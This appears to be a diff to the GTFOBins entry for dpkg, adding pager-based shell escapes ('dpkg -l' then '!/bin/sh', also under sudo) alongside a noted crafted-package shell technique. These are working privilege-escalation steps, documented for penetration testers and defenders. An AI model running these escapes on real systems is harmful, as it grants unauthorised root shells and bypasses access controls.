@@ -1,6 +1,15 @@
 ---
 functions:
+  shell:
+    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+      code: |
+        dpkg -l
+        !/bin/sh
   sudo:
+    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+      code: |
+        sudo dpkg -l
+        !/bin/sh
     - description: |
         It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
         ```
